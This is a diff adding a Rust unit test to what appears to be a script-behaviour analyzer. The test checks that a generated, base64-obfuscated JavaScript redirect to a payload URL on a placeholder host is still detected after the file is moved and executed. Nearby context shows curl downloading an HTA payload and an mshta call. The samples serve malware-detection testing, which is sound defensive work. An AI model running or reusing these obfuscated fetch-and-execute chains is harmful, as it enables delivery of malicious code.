@@ -23459,6 +23459,23 @@ mshta renamed.hta"#,
     }
 
     #[test]
+    fn move_directory_destination_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+move /y original.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://move-dir-js.example/payload")
+            }),
+            "move directory destination did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ren_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://ren-download.example/payload.hta
